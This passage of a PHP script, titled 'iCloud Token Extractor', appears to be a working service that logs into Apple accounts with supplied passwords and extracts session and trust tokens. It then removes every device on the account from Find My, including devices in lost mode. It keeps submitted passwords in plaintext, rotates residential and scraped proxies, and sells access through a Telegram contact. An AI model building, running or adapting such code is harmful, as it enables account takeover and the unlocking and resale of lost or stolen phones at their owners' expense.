        emit_log('debug', "    ← authForUserDevice HTTP {$resp['status']}");

        $auth_token = 'Invalid';
        if ($resp['status'] === 200) {
            $auth_result = json_decode($resp['body'], true);
            $auth_token = $auth_result['authToken'] ?? 'Invalid';
            if ($auth_token !== 'Invalid')
                emit_log('debug', '    ✓ authToken: ' . substr($auth_token, 0, 30) . '...');
        }

        $is_removed = false;
        $status_code = 401;
        $failure_reason = null;

        if ($auth_token === 'Invalid') {
            $failure_reason = 'Apple não devolveu authToken na fase de autorização';
            emit_log('warning', '    ⚠️ authToken Invalid — skipping remove');
        }
        else {
            // 3b: Remove device
            $remove_url = "{$server}/fmipservice/client/web/remove";
            $remove_payload = json_encode(['device' => $device_id, 'authToken' => $auth_token]);
            $resp = curl_session_request('POST', $remove_url, $remove_payload, fmip_headers(''), null, 15, $cookie_jar);
            $http_code = $resp['status'];
            emit_log('debug', "    ← remove HTTP {$http_code}");

            $remove_result = json_decode($resp['body'], true);
            $json_status = is_array($remove_result) ? ($remove_result['statusCode'] ?? null) : null;

            if ($json_status !== null) {
                $status_code = (int)$json_status;
            }
            else {
                // La Apple responde HTTP 200 sin "statusCode" (o con cuerpo
                // vacío) cuando acepta la remoción: antes eso se forzaba a 401
                // y el aparelho salía como NOT_REMOVED aunque ya estaba fuera.
                $accepted = ($http_code === 200)
                    && empty($remove_result['error'])
                    && empty($remove_result['errorMessage']);
                $status_code = $accepted ? 200 : 401;
            }
            $is_removed = ($status_code === 200);
        }

        // Remoção já agendada na Apple (pending until) conta como removida.
        $pending_ts = isset($device['pendingRemoveUntilTS']) ? (int)$device['pendingRemoveUntilTS'] : 0;
        if (!$is_removed && $pending_ts > 0) {
            $is_removed = true;
            $status_code = 200;
            emit_log('success', '    ✅ REMOVED (já agendado/pending)');
        }

        if ($is_removed) {
            $removed_count++;
        }
        else {
            $failure_reason = $failure_reason ?: "remove retornou statusCode {$status_code}";
            emit_log('warning', "    ❌ NOT REMOVED (HTTP {$status_code}) — {$failure_reason}");
        }

        $devices[] = [
            'model' => $model, 'name' => $name,
            'device_class' => $device['deviceClass'] ?? '',
            'product_type' => $device['rawDeviceModel'] ?? '',
            'battery_level_percent' => $battery,
            'removal_status' => $is_removed ? 'REMOVED' : 'NOT_REMOVED',
            'was_removed' => $is_removed,
            'status_code' => $status_code,
            'error' => $failure_reason,
            'pending_remove_until_date' => $pending_ts > 0
                ? date('Y-m-d H:i:s', (int)($pending_ts / 1000))
                : null,
            'lost_mode_enabled' => $lost_enabled,
            'lost_message' => $lost_message, 'lost_phone' => $lost_phone,
        ];
    }

    $removal['status'] = 'success';
    $removal['owner'] = $owner;
    $removal['devices'] = $devices;
    $removal['devices_count'] = count($devices);
    $removal['removed_count'] = $removed_count;
    $removal['failed_count'] = count($devices) - $removed_count;

    $STATS['autoremove_sent']++;
    $STATS['autoremove_success']++;
    $STATS['devices_removed'] += $removed_count;

    if (!empty($devices)) {
        emit_log('success', "  ✅ AutoRemove OK — Owner: {$owner} | Devices: " . count($devices) . " | Removed: {$removed_count}");
        foreach ($devices as $i => $dev) {
            $icon = ($dev['removal_status'] === 'REMOVED') ? '✅' : '❌';
            $lost = $dev['lost_mode_enabled'] ? ' ⚠️LOST' : '';
            $bat = $dev['battery_level_percent'] > 0 ? " 🔋" . round($dev['battery_level_percent']) . "%" : '';
            $n = $i + 1;
            emit_log('removal', "    {$icon} #{$n} {$dev['model']} ({$dev['name']}){$lost}{$bat} → {$dev['removal_status']}");
        }
    }
    else {
        emit_log('info', "  ℹ No devices found for {$apple_id}");
    }

    @unlink($cookie_jar);
    return $removal;
}


// ============================================================================
// SINGLE ACCOUNT AUTH (direct mode — no server needed)
// ============================================================================
function run_single_auth(string $apple_id, string $password, array $cfg): void
{
    global $STATS;

    echo "\n";
    emit_log('system', '╔══════════════════════════════════════════════════╗');
    emit_log('system', '║   iCloud Token Extractor — PHP Port v1.0        ║');
    emit_log('system', '╚══════════════════════════════════════════════════╝');
    echo "\n";

    // Check extensions
    if (!extension_loaded('gmp') && !function_exists('gmp_init')) {
        emit_log('error', '❌ Ni la extensión GMP ni BCMATH están disponibles en PHP.');
        exit(1);
    }
    if (!extension_loaded('curl')) {
        emit_log('error', '❌ Extension cURL no disponible.');
        exit(1);
    }
    $gmp_status = extension_loaded('gmp') ? 'OK (Native)' : 'OK (BCMath Polyfill)';
    emit_log('system', "✓ GMP: {$gmp_status} | cURL: OK | PHP: " . PHP_VERSION);
    echo "\n";

    // ── Account Info ──
    emit_log('system', '┌─────────────────────────────────────────────────┐');
    emit_log('system', "│  📧 Account:  {$apple_id}");
    emit_log('system', "│  🔑 Password: {$password}");
    emit_log('system', "│  🌐 Mode:     " . strtoupper($cfg['mode']));
    $ar_label = ($cfg['autoremove_enabled'] ?? true) ? 'ON' : 'OFF';
    emit_log('system', "│  🗑️  AutoRemove: {$ar_label}");
    emit_log('system', '└─────────────────────────────────────────────────┘');
    echo "\n";

    // ── Step 1: SRP Authentication ──
    emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    emit_log('info', '🔐 STEP 1: SRP Authentication');
    emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    $t0 = microtime(true);

    $result = authenticate($apple_id, $password, $cfg);
    $duration = round(microtime(true) - $t0, 1);

    echo "\n";
    emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    emit_log('info', '📊 AUTHENTICATION RESULT');
    emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

    $icon = $result['success'] ? '✅' : '❌';
    $status_type = $result['success'] ? 'success' : 'error';
    emit_log($status_type, "{$icon} Status:      {$result['status']}");
    emit_log('info', "   HTTP Code:   {$result['status_code']}");
    emit_log('info', "   Duration:    {$duration}s");

    if ($result['error_message']) {
        emit_log('warning', "   Error:       {$result['error_message']}");
    }

    // ── Tokens ──
    if (!empty($result['tokens'])) {
        echo "\n";
        emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        emit_log('info', '🎫 TOKENS EXTRACTED');
        emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        foreach ($result['tokens'] as $key => $value) {
            $display = strlen($value) > 60 ? substr($value, 0, 57) . '...' : $value;
            emit_log('success', "   {$key}: {$display}");
        }
        // Full session_token on its own line
        if (!empty($result['tokens']['session_token'])) {
            echo "\n";
            emit_log('info', '🔑 FULL SESSION TOKEN:');
            emit_log('success', $result['tokens']['session_token']);
        }
    }
    else {
        echo "\n";
        emit_log('warning', '⚠️  No tokens extracted');
    }

    // ── Step 2: Auto-Remove (if token obtained) ──
    if ($result['success'] && !empty($result['tokens']['session_token']) && ($cfg['autoremove_enabled'] ?? true)) {
        echo "\n";
        emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        emit_log('info', '🗑️  STEP 2: Auto-Remove Devices');
        emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

        $session_token = $result['tokens']['session_token'];
        $removal = autoremove_execute($apple_id, $password, $session_token, $cfg);

        echo "\n";
        emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        emit_log('info', '📊 AUTO-REMOVE RESULT');
        emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        $r_icon = ($removal['status'] === 'success') ? '✅' : '❌';
        emit_log($removal['status'] === 'success' ? 'success' : 'error', "{$r_icon} Status: {$removal['status']}");
        if ($removal['owner'])
            emit_log('info', "   Owner:    {$removal['owner']}");
        emit_log('info', "   Devices:  {$removal['devices_count']}");
        emit_log('info', "   Removed:  {$removal['removed_count']}");
        emit_log('info', "   Failed:   {$removal['failed_count']}");
        if ($removal['error'])
            emit_log('error', "   Error:    {$removal['error']}");
    }

    // ── Final Summary ──
    echo "\n";
    emit_log('system', '╔══════════════════════════════════════════════════╗');
    emit_log('system', '║                  DONE                            ║');
    emit_log('system', '╚══════════════════════════════════════════════════╝');
    echo "\n";
}

// ============================================================================
// IP WHITELIST & ACCESS CONTROL
// ============================================================================
define('TRAFFIC_FILE', __DIR__ . '/traffic.json');
define('REQUEST_LOG_FILE', __DIR__ . '/request_log.txt');
define('REQUESTS_PHP_FILE', __DIR__ . '/requests_php.json');

function logRequestResponse(array $request, array $response): void
{
    $records = file_exists(REQUESTS_PHP_FILE)
        ? json_decode(file_get_contents(REQUESTS_PHP_FILE), true) ?? []
        : [];
    $records[] = [
        'timestamp' => date('Y-m-d H:i:s'),
        'unix_time' => time(),
        'request' => $request,
        'response' => $response,
    ];
    if (count($records) > 500) {
        $records = array_slice($records, -500);
    }
    file_put_contents(REQUESTS_PHP_FILE, json_encode($records, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES), LOCK_EX);
}


define('IP_JSON_FILE', __DIR__ . '/ip.json');

$ALLOWED_SOURCES = file_exists(IP_JSON_FILE)
    ? json_decode(file_get_contents(IP_JSON_FILE), true) ?? ['ips' => [], 'domains' => []]
    : ['ips' => [], 'domains' => []];

function getClientIP(): string
{
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = explode(',', $_SERVER[$header])[0];
            return trim($ip);
        }
    }
    return 'unknown';
}

function getRequestOrigin(): ?string
{
    return $_SERVER['HTTP_ORIGIN'] ?? $_SERVER['HTTP_REFERER'] ?? null;
}

function extractDomain(?string $url): ?string
{
    if (!$url)
        return null;
    $parsed = parse_url($url);
    return $parsed['host'] ?? null;
}

function isSourceAllowed(string $ip, ?string $domain, array $allowedSources): bool
{
    // Solo se valida IP — dominio/origen no importa, cualquier sitio puede llamar siempre que la IP esté autorizada
    return in_array($ip, $allowedSources['ips'], true);
}

function logTraffic(array $data): void
{
    $traffic = file_exists(TRAFFIC_FILE)
        ? json_decode(file_get_contents(TRAFFIC_FILE), true) ?? []
        : [];
    $traffic[] = $data;
    if (count($traffic) > 1000) {
        $traffic = array_slice($traffic, -1000);
    }
    file_put_contents(TRAFFIC_FILE, json_encode($traffic, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);

    $ip = $data['ip'] ?? '?';
    $status = $data['response_status'] ?? '?';
    $code = $data['response_code'] ?? '?';
    unified_log('info', 'TRAFFIC', "IP:{$ip} → {$status} (HTTP {$code})");
}

function writeRequestLog(string $message): void
{
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents(REQUEST_LOG_FILE, "[$timestamp] $message\n", FILE_APPEND);
    unified_log('info', 'HTTP', $message);
}

// ============================================================================
// HTTP REQUEST HANDLER (GET/POST API mode)
// ============================================================================
function handle_http_request(array $cfg): void
{
    global $ALLOWED_SOURCES;

    // Allow CORS
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
    header('Content-Type: application/json; charset=utf-8');

    // Handle preflight
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit;
    }

    // ── Capture request metadata ──
    $clientIP = getClientIP();
    $origin = getRequestOrigin();
    $domain = extractDomain($origin);
    $timestamp = date('Y-m-d H:i:s');

    $trafficEntry = [
        'timestamp' => $timestamp,
        'unix_time' => time(),
        'ip' => $clientIP,
        'origin' => $origin,
        'domain' => $domain,
        'method' => $_SERVER['REQUEST_METHOD'],
        'uri' => $_SERVER['REQUEST_URI'] ?? '',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? null,
        'content_type' => $_SERVER['CONTENT_TYPE'] ?? null,
        'params' => [
            'apple_id' => $_REQUEST['apple_id'] ?? $_REQUEST['email'] ?? '[not provided]',
            'password' => isset($_REQUEST['password']) ? '[REDACTED]' : '[not provided]'
        ],
        'headers' => [
            'accept' => $_SERVER['HTTP_ACCEPT'] ?? null,
            'x_forwarded_for' => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? null,
            'cf_connecting_ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? null,
        ],
        'allowed' => false,
        'response_code' => null,
        'response_status' => null
    ];

    // ── IP / Domain validation ──
    if (!isSourceAllowed($clientIP, $domain, $ALLOWED_SOURCES)) {
        unified_log_start_request('[blocked]', $clientIP, $cfg['mode']);
        unified_log('warning', 'ACCESS', "BLOCKED: Unauthorized IP {$clientIP} (domain: {$domain})");
        unified_log_end_request(false, 'blocked', 403, 0.0, null);

        $trafficEntry['response_code'] = 403;
        $trafficEntry['response_status'] = 'blocked';
        logTraffic($trafficEntry);

        writeRequestLog("BLOCKED: Unauthorized source - IP: $clientIP, Domain: $domain Contact Admin for access https://t.me/irealmServerArcane");

        http_response_code(403);
        echo json_encode([
            'success' => false,
            'error' => 'Access denied',
            'message' => 'BLOCKED: Unauthorized source - IP: ' . $clientIP . ' Contact Admin for access https://t.me/irealmServerArcane',
            'ip' => $clientIP
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        return;
    }

    $trafficEntry['allowed'] = true;

    // ── Parse parameters (GET, POST form, POST JSON) ──
    $apple_id = $_REQUEST['apple_id'] ?? $_REQUEST['email'] ?? '';
    $password = $_REQUEST['password'] ?? '';

    // Also check JSON body for POST
    if (empty($apple_id) && $_SERVER['REQUEST_METHOD'] === 'POST') {
        $raw = file_get_contents('php://input');
        $json_body = json_decode($raw, true);
        if ($json_body) {
            $apple_id = $json_body['apple_id'] ?? $json_body['email'] ?? $apple_id;
            $password = $json_body['password'] ?? $password;
        }
    }

    // Validate required params
    if (empty($apple_id) || empty($password)) {
        unified_log_start_request($apple_id ?: '[empty]', $clientIP, $cfg['mode']);
        unified_log('warning', 'PARAMS', 'Missing apple_id or password');
        unified_log_end_request(false, 'bad_request', 400, 0.0, null);

        $trafficEntry['response_code'] = 400;
        $trafficEntry['response_status'] = 'bad_request';
        logTraffic($trafficEntry);
        writeRequestLog("ERROR: Missing parameters from IP: $clientIP");

        http_response_code(400);
        echo json_encode([
            'success' => false,
            'error' => 'missing_params',
            'message' => 'Required: apple_id (or email) and password',
            'usage' => [
                'GET' => '?apple_id=user@icloud.com&password=Pass123',
                'POST' => 'apple_id=user@icloud.com&password=Pass123',
                'POST_JSON' => '{"apple_id":"user@icloud.com","password":"Pass123"}'
            ]
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        return;
    }

    writeRequestLog("REQUEST: $apple_id from $clientIP ($domain)");

    // ── Start unified log for this request ──
    unified_log_start_request($apple_id, $clientIP, $cfg['mode']);

    // ── Suppress CLI output & run authentication ──
    ob_start();

    $t0 = microtime(true);
    $result = authenticate($apple_id, $password, $cfg);
    $duration = round(microtime(true) - $t0, 1);

    // Auto-remove if enabled and token obtained
    $removal = null;
    if ($result['success'] && !empty($result['tokens']['session_token']) && ($cfg['autoremove_enabled'] ?? true)) {
        $removal = autoremove_execute($apple_id, $password, $result['tokens']['session_token'], $cfg);
    }

    ob_end_clean();

    // ── Log result ──
    $statusLabel = $result['success'] ? 'SUCCESS' : 'FAILED';
    writeRequestLog("{$statusLabel}: $apple_id → {$result['status']} (HTTP {$result['status_code']}) [{$duration}s]");

    // ── End unified log ──
    $method_raw = $result['connection_method'] ?? 'direct';
    unified_log_end_request($result['success'], $result['status'], $result['status_code'] ?? 0, $duration, $method_raw);

    // ── Build JSON response (compatible with request.php format) ──
    $elapsed_time = (int)round($duration);

    // Map connection method to human-readable label
    $method_raw = $result['connection_method'] ?? 'direct';
    $method_labels = [
        'direct' => 'direct',
        'proxy' => 'proxy (residential)',
        'site_unblocker' => 'site_unblocker (decodo)',
        'free_proxy' => 'free_proxy (scraped)',
        'gitproxy' => 'gitproxy (github-cdn)',
    ];
    $connection_label = $method_labels[$method_raw] ?? $method_raw;

    $response = [
        'success' => $result['success'],
        'status' => $result['status'],
        'apple_id' => $apple_id,
        'connection_method' => $connection_label,
        'tokens' => [
            'session_token' => $result['tokens']['session_token'] ?? null,
            'session_id' => $result['tokens']['session_id'] ?? null,
            'scnt' => $result['tokens']['scnt'] ?? null,
            'trust_token' => $result['tokens']['trust_token'] ?? null,
            'account_country' => $result['tokens']['account_country'] ?? null,
        ],
        'status_code' => $result['status_code'],
        'error_message' => $result['error_message'],
        'elapsed_time' => $elapsed_time,
    ];

    if ($removal !== null) {
        $response['autoremove'] = [
            'status' => $removal['status'],
            'owner' => $removal['owner'] ?? '',
            'devices_count' => $removal['devices_count'] ?? 0,
            'removed_count' => $removal['removed_count'] ?? 0,
            'failed_count' => $removal['failed_count'] ?? 0,
            'devices' => $removal['devices'] ?? [],
            'error' => $removal['error'] ?? null,
        ];
    }

    // ── Traffic log ──
    $trafficEntry['response_code'] = $result['status_code'];
    $trafficEntry['response_status'] = $result['status'];
    $trafficEntry['elapsed_time'] = $duration;
    logTraffic($trafficEntry);

    // ── HTTP response code ──
    if ($result['success']) {
        http_response_code(200);
    }
    elseif ($result['status_code'] === 401) {
        http_response_code(401);
    }
    elseif ($result['status_code'] === 403) {
        http_response_code(403);
    }
    elseif ($result['status_code'] === 503) {
        http_response_code(503);
    }
    else {
        http_response_code(200);
    }

    // ── Log request/response to requests_php.json ──
    logRequestResponse(
    [
        'apple_id' => $apple_id,
        'password' => $password,
        'ip' => $clientIP,
        'domain' => $domain,
        'method' => $_SERVER['REQUEST_METHOD'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? null,
        'configured_mode' => $cfg['mode'],
        'connection_method' => $connection_label,
    ],
        $response
    );

    echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

// Detect if running via HTTP (web server) or CLI
if (php_sapi_name() !== 'cli') {
    // ── HTTP MODE (GET/POST) ──
    handle_http_request($DEFAULT_CONFIG);
}
else {
    // ── CLI MODE ──
    if (empty($argv[1]) || empty($argv[2])) {
        echo "Usage: php token_worker.php <apple_id> <password>\n";
        exit(1);
    }

    $apple_id = $argv[1];
    $password = $argv[2];

    // Disable output buffering for real-time logs
    if (ob_get_level())
        ob_end_flush();
    ini_set('output_buffering', '0');
    ini_set('implicit_flush', '1');

    run_single_auth($apple_id, $password, $DEFAULT_CONFIG);
}
